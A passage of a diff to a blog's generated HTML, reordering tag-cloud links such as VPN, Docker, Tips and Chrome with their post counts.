-				<li><a href="/tags/VPN/" title="VPN">VPN<sup>4</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/Tools/" title="Tools">Tools<sup>4</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/Docker/" title="Docker">Docker<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/VPN/" title="VPN">VPN<sup>4</sup></a></li>
 			
 		
 			
@@ -357,15 +356,15 @@
 			
 		
 			
-				<li><a href="/tags/EFI/" title="EFI">EFI<sup>3</sup></a></li>
+				<li><a href="/tags/Tips/" title="Tips">Tips<sup>3</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/人生/" title="人生">人生<sup>3</sup></a></li>
+				<li><a href="/tags/Learning/" title="Learning">Learning<sup>3</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/WikiLeaks/" title="WikiLeaks">WikiLeaks<sup>3</sup></a></li>
+				<li><a href="/tags/Chrome/" title="Chrome">Chrome<sup>3</sup></a></li>
 			
 		
 		</ul>
